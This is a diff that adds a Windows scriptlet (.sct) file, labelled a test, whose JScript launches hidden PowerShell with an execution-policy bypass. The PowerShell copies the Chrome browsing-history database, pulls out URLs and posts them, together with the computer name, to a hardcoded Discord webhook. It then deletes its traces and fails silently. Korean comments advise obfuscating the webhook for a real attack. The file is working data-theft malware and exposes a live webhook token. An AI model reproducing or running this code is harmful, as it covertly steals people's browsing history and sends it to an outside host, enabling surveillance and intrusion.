@@ -1,0 +1,45 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration 
+    progid="ChromeExfilTest"
+    classid="{00000000-0000-0000-0000-0000FEEDACDC}"
+    description="Test SCT - Chrome History to Discord via PowerShell"
+>
+
+<script language="JScript">
+<![CDATA[
+    try {
+        var shell = new ActiveXObject("WScript.Shell");
+        
+        // Discord webhook (실제 공격 시 분할 저장하거나 난독화 추천)
+        var webhook = "https://discord.com/api/webhooks/1472244980662927381/FycSobkkKh_MzI-EcY_cZYC7OGdo9U8yTKBReRTzkfeagFVW6hit4W7ODQ8MqwCL9iiv";
+        
+        // PowerShell one-liner로 Chrome 히스토리 추출 & 전송
+        // 원본 ino의 로직을 그대로 압축 → 실행정책 우회 포함
+        var psCommand = 
+            "$hook='" + webhook + "';" +
+            "$src=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History\";" +
+            "$dst=\"$env:TEMP\\h.db\";" +
+            "Copy-Item $src $dst -Force;" +
+            "$b=[IO.File]::ReadAllBytes($dst);" +
+            "$raw=[System.Text.Encoding]::ASCII.GetString($b);" +
+            "$urls=[regex]::Matches($raw,'https?://[a-zA-Z0-9./\\-_?=&%]+') | Select -Expand Value | ? Length -lt 150 | Select -First 10;" +
+            "$msg=\"[SCT HISTORY] \"+$env:COMPUTERNAME+\"`n\"+($urls -join \"`n\");" +
+            "irm $hook -Method Post -Body @{content=$msg};" +
+            "Remove-Item $dst -Force;";
+
+        // PowerShell 숨김 실행 (창 안 뜨게)
+        shell.Run('powershell.exe -ep bypass -w hidden -c "' + psCommand + '"', 0, true);
+
+        // 테스트용 무해 확인 (주석 해제 시 calc 띄움)
+        // shell.Run("calc.exe", 1, false);
+
+    } catch(e) {
+        // silent fail
+    }
+]]>
+</script>
+
+</registration>
+</scriptlet>
